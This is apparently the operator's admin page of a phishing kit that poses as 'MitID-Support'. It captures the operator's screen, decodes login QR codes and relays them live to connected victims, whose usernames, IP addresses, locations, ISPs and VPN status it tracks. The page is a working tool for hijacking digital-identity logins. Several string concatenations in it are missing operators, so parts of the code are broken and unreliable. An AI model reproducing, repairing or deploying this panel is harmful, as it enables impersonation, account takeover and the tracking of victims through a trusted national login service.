<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Admin Panel - Support QR</title>

  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <script src="/socket.io/socket.io.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>

  <style>
    body { background:#f8f9fa; }
    .container { max-width:1100px; }
    #qrCanvas { display:inline-block; margin-top:8px; }
    #debugLog { background:#eee; padding:10px; height:200px; overflow:auto; font-size:13px; }
    th, td { vertical-align: middle !important; }
    .muted-row { color:#6c757d; }
  </style>
</head>
<body>
  <div class="container my-4">
    <div class="d-flex align-items-center mb-4">
      <img src="https://i.postimg.cc/WzDHPTPX/logo.jpg" alt="logo" style="width:50px;height:auto;margin-right:12px;">
      <h3 class="m-0">MitID-Support â€” Admin Panel</h3>
    </div>

    <div class="alert alert-info">
      Instruct users to navigate to: <strong><span id="siteUrl"></span></strong>
    </div>

    <div class="mb-3">
      <button id="start" class="btn btn-success">Start Stream</button>
      <button id="stop" class="btn btn-danger">Stop Stream</button>
      <button id="hide" class="btn btn-warning">Hide QR</button>
      <button id="show" class="btn btn-info">Show QR</button>
      <button id="freeze" class="btn btn-secondary">Freeze Scan</button>
      <button id="unfreeze" class="btn btn-light">Unfreeze Scan</button>
    </div>

    <div class="mb-3">
      <p>Status: <span id="status">Idle</span></p>
      <p>Hidden: <span id="hiddenStatus">No</span></p>
      <p>Frozen: <span id="frozenStatus">No</span></p>
      <p>Admin ping: <span id="adminPing">0</span> ms</p>
      <p>Scan interval: <span id="scanIntervalDisplay">500</span> ms</p>
      <div class="input-group mb-2" style="max-width:320px">
        <input id="scanIntervalInput" class="form-control" placeholder="Scan interval (ms)" type="number" min="100" max="5000"/>
        <button id="setScanInterval" class="btn btn-outline-primary">Set</button>
      </div>
    </div>

    <h5>Connected Clients (<span id="clientCount">0</span>)</h5>
    <div id="clientListContainer" class="mb-3" style="max-height: 250px; overflow-y: auto;">
      <table class="table table-striped table-sm">
        <thead class="table-dark">
          <tr>
            <th>Username</th>
            <th>IP</th>
            <th>City</th>
            <th>Region</th>
            <th>Country</th>
            <th>ISP</th>
            <th>VPN/VPS</th>
            <th>Ping (ms)</th>
            <th>Socket ID</th>
          </tr>
        </thead>
        <tbody id="clientListBody"></tbody>
      </table>
    </div>
    <button id="refreshList" class="btn btn-outline-secondary mb-3">Refresh Client List</button>

    <h5>QR Preview</h5>
    <div id="qrCanvas"></div>

    <h5 class="mt-3">Screen Capture Preview</h5>
    <video id="video" width="640" height="360" autoplay style="border:1px solid #ccc"></video>
    <canvas id="canvas" width="1280" height="720" style="display:none"></canvas>

    <h5 class="mt-3">Debug Log</h5>
    <div id="debugLog"></div>
  </div>

<script>
(() => {
  const socket = io();
  socket.emit('join', 'admin');
  document.getElementById('siteUrl').textContent = window.location.origin;

  const statusEl = document.getElementById('status');
  const hiddenStatusEl = document.getElementById('hiddenStatus');
  const frozenStatusEl = document.getElementById('frozenStatus');
  const adminPingEl = document.getElementById('adminPing');
  const clientListBody = document.getElementById('clientListBody');
  const clientCountEl = document.getElementById('clientCount');
  const qrCanvasDiv = document.getElementById('qrCanvas');
  const debugLog = document.getElementById('debugLog');
  const scanIntervalDisplay = document.getElementById('scanIntervalDisplay');

  let stream = null;
  let detectionInterval = null;
  let lastQrValue = null;
  let scanIntervalMs = localStorage.getItem('scanIntervalMs') ? parseInt(localStorage.getItem('scanIntervalMs')) : 500;
  let isFrozen = localStorage.getItem('isFrozen') === 'true';
  let isHidden = localStorage.getItem('isHidden') === 'true';

  function log(msg) {
    const p = document.createElement('p');
    p.textContent = `${new Date().toLocaleTimeString()} - ${msg}`;
    debugLog.appendChild(p);
    if (debugLog.children.length > 300) debugLog.removeChild(debugLog.firstChild);
    debugLog.scrollTop = debugLog.scrollHeight;
  }

  function updateScanDisplay() { scanIntervalDisplay.textContent = scanIntervalMs; }
  updateScanDisplay();

  document.getElementById('start').addEventListener('click', startStream);
  document.getElementById('stop').addEventListener('click', stopStream);
  document.getElementById('hide').addEventListener('click', () => toggleHide(true));
  document.getElementById('show').addEventListener('click', () => toggleHide(false));
  document.getElementById('freeze').addEventListener('click', freezeScan);
  document.getElementById('unfreeze').addEventListener('click', unfreezeScan);
  document.getElementById('setScanInterval').addEventListener('click', () => {
    const v = parseInt(document.getElementById('scanIntervalInput').value);
    if (!v || v < 100 || v > 5000) return alert('Enter 100-5000 ms');
    scanIntervalMs = v;
    localStorage.setItem('scanIntervalMs', String(v));
    updateScanDisplay();
    if (detectionInterval) {
      clearInterval(detectionInterval);
      detectionInterval = setInterval(detectQr, scanIntervalMs);
    }
    log('Scan interval set to '  v  ' ms');
    document.getElementById('scanIntervalInput').value = '';
  });

  document.getElementById('refreshList').addEventListener('click', () => socket.emit('request_client_list'));

  socket.on('state', (state) => {
    isHidden = state.isHidden;
    localStorage.setItem('isHidden', String(isHidden));
    if (state.isStreaming) {
      statusEl.textContent = 'Streaming';
    } else {
      statusEl.textContent = 'Idle';
    }
    updateHiddenStatus();
    if (state.currentQrValue && !isHidden) {
      qrCanvasDiv.innerHTML = '';
      new QRCode(qrCanvasDiv, { text: state.currentQrValue, width: 128, height: 128 });
      lastQrValue = state.currentQrValue;
      log('Initialized preview from server state');
    }
  });

  socket.on('hide_state', (hidden) => {
    isHidden = hidden;
    localStorage.setItem('isHidden', String(hidden));
    if (hidden) {
      qrCanvasDiv.innerHTML = '';
      log('QR hidden by server');
    } else if (lastQrValue) {
      qrCanvasDiv.innerHTML = '';
      new QRCode(qrCanvasDiv, { text: lastQrValue, width: 128, height: 128 });
      log('QR shown by server');
    }
    updateHiddenStatus();
  });

  socket.on('qr_preview', (value) => {
    qrCanvasDiv.innerHTML = '';
    if (value && !isHidden) {
      new QRCode(qrCanvasDiv, { text: value, width: 128, height: 128 });
      lastQrValue = value;
      log('Preview updated');
    } else {
      lastQrValue = value || null;
      log('Preview cleared');
    }
  });

  socket.on('client_list', (list) => {
    clientListBody.innerHTML = '';
    clientCountEl.textContent = list.length;
    list.forEach(c => {
      const tr = document.createElement('tr');
      if (/Not logged in/i.test(c.username)) tr.classList.add('muted-row');
      tr.innerHTML = `
        <td>${c.username || '-'}</td>
        <td>${c.ip || '-'}</td>
        <td>${c.city || '-'}</td>
        <td>${c.region || '-'}</td>
        <td>${(c.countryFlag ? c.countryFlag  ' ' : '')  (c.country || '-')}</td>
        <td>${c.isp || '-'}</td>
        <td>${c.vpn ? '<span style="color:red;">Yes</span>' : 'No'}</td>
        <td>${typeof c.ping === 'number' ? c.ping : '-'}</td>
        <td>${c.id || '-'}</td>`;
      clientListBody.appendChild(tr);
    });
  });

  setInterval(() => socket.emit('request_client_list'), 3000);
  socket.on('ping', (startTime) => socket.emit('pong', startTime));
  socket.on('your_ping', (p) => adminPingEl.textContent = p);
  socket.on('error', (m) => alert(m));

  async function startStream() {
    if (stream) {
      log('Stream already active');
      return;
    }
    try {
      stream = await navigator.mediaDevices.getDisplayMedia({
        video: { width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } }
      });
      const videoEl = document.getElementById('video');
      videoEl.muted = true;
      videoEl.srcObject = stream;
      const p = videoEl.play();
      if (p && p.catch) p.catch(e => log('Video play rejected: '  e));
      socket.emit('start_stream');
      statusEl.textContent = 'Streaming';
      if (!isFrozen) detectionInterval = setInterval(detectQr, scanIntervalMs);
      log('Stream started');
    } catch (err) {
      log('Screen share failed: '  (err.message || err));
      alert('Screen share failed: '  (err.message || err));
    }
  }

  function stopStream() {
    if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
    if (detectionInterval) { clearInterval(detectionInterval); detectionInterval = null; }
    socket.emit('stop_stream');
    statusEl.textContent = 'Idle';
    lastQrValue = null;
    qrCanvasDiv.innerHTML = '';
    log('Stream stopped');
  }

  function detectQr() {
    const video = document.getElementById('video');
    if (!video || !video.videoWidth) return;
    const canvas = document.getElementById('canvas');
    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const imageData = ctx.getImageData(0,0,canvas.width,canvas.height);
    const code = jsQR(imageData.data, imageData.width, imageData.height);
    if (code && code.data && code.data !== lastQrValue) {
      lastQrValue = code.data;
      qrCanvasDiv.innerHTML = '';
      if (!isHidden) new QRCode(qrCanvasDiv, { text: code.data, width: 128, height:128 });
      socket.emit('qr_update', code.data);
      log('Detected new QR: '  code.data);
    }
  }

  function toggleHide(h) {
    isHidden = !!h;
    localStorage.setItem('isHidden', String(isHidden));
    socket.emit('toggle_hide', isHidden);
    updateHiddenStatus();
    if (isHidden) {
      qrCanvasDiv.innerHTML = '';
    } else if (lastQrValue) {
      qrCanvasDiv.innerHTML = '';
      new QRCode(qrCanvasDiv, { text: lastQrValue, width: 128, height:128 });
    }
    log('Hide toggled: '  isHidden);
  }

  function updateHiddenStatus() {
    hiddenStatusEl.textContent = isHidden ? 'Yes' : 'No';
    hiddenStatusEl.style.color = isHidden ? 'red' : 'green';
    frozenStatusEl.textContent = isFrozen ? 'Yes' : 'No';
    frozenStatusEl.style.color = isFrozen ? 'red' : 'green';
  }

  function freezeScan() {
    if (detectionInterval) { clearInterval(detectionInterval); detectionInterval = null; }
    isFrozen = true; localStorage.setItem('isFrozen','true'); updateHiddenStatus(); log('Scan frozen');
  }
  function unfreezeScan() {
    isFrozen = false; localStorage.setItem('isFrozen','false'); updateHiddenStatus();
    if (stream && !detectionInterval) detectionInterval = setInterval(detectQr, scanIntervalMs);
    log('Scan unfrozen');
  }
})();
</script>
</body>
</html>
